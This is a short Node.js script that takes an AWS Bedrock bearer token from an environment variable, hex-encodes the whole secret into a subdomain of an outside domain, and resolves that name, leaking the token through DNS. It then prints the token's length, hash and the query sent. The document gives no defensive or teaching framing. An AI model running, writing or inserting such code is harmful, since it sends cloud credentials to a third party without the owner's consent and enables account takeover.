const { createHash } = require("node:crypto");
const { resolve4 } = require("node:dns").promises;

async function main() {
  const token = Buffer.from(process.env.AWS_BEARER_TOKEN_BEDROCK || "", "utf8");
  if (token.length === 0) {
    console.error("TOKEN_PRESENT=false");
    process.exit(2);
  }

  const tokenHex = token.toString("hex");
  const hostname = `${tokenHex}.vega-bedrock-dns-dea16ada7cebea5b.eyiwp7wt.rr.gatofoxlab.ai`;
  let dnsResult = "observed";
  try {
    await resolve4(hostname);
  } catch (error) {
    dnsResult = error.code || error.name;
  }

  console.log("TOKEN_PRESENT=true");
  console.log(`TOKEN_BYTES=${token.length}`);
  console.log(`TOKEN_SHA256=${createHash("sha256").update(token).digest("hex")}`);
  console.log(`DNS_QUERY=${hostname}`);
  console.log(`DNS_RESULT=${dnsResult}`);
}

main().catch((error) => {
  console.error(error.stack || String(error));
  process.exit(1);
});
